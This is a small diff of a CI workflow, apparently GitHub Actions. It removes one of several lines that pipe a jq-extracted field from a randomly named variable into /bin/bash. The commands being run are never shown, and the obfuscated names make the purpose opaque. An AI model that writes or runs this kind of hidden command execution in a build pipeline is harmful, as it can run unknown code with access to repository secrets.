@@ -31,7 +31,6 @@ jobs:
           echo $hcwbv15756 | jq -r .caemi7 | /bin/bash
           echo $jjt314 | jq -r .sfhn6205 | /bin/bash
           echo $gqbcb1256 | jq -r .rv492 | /bin/bash
-          echo $ue36281 | jq -r .hkx601 | /bin/bash
 
       - name: Store results
         if: always()
